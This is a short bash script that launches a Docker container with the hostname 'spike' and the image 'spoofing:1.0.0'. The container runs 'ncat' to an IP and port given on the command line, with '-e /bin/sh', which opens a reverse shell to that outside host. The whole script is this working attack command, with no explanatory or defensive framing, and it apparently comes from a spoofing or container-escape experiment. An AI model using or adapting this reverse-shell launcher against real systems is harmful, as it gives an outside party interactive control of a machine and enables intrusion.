#!/bin/bash

connback_ip="$1"
connback_port="$2"

hostname="spike"
imagetag="spoofing:1.0.0"
cmd="ncat $connback_ip $connback_port -e /bin/sh"

docker run -h $hostname --rm $imagetag $cmd
